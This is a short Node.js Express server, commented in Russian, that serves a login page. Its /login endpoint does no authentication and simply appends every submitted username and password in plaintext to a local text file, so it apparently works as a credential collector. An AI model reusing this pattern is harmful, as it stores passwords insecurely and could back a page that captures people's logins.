const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');
const app = express();
const port = 3000;

// Настройка CORS с разрешением на запросы с фронтенда
const corsOptions = {
    origin: 'http://127.0.0.1:5500', // Разрешаем доступ только с этого источника
    methods: ['GET', 'POST', 'OPTIONS'], // Разрешаем методы
    allowedHeaders: ['Content-Type', 'Authorization'], // Разрешаем заголовки
    credentials: true // Разрешаем использование cookies (если нужно)
};

app.use(cors(corsOptions)); // Используем CORS

// Middleware для парсинга JSON данных
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// Обрабатываем статические файлы (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// Обрабатываем POST-запрос для сохранения данных
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: 'Please provide both username and password' });
    }

    const data = `Username: ${username}\nPassword: ${password}\n\n`;

    fs.appendFile('user_data.txt', data, (err) => {
        if (err) {
            return res.status(500).json({ message: 'Error saving data' });
        }
        res.status(200).json({ message: 'Data saved successfully!' });
    });
});

// Обработка OPTIONS-запросов для разрешения CORS
app.options('*', cors(corsOptions));

// Сервер на главной странице (все запросы на root будут отдавать index.html)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public','login-server', 'index.html'));
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
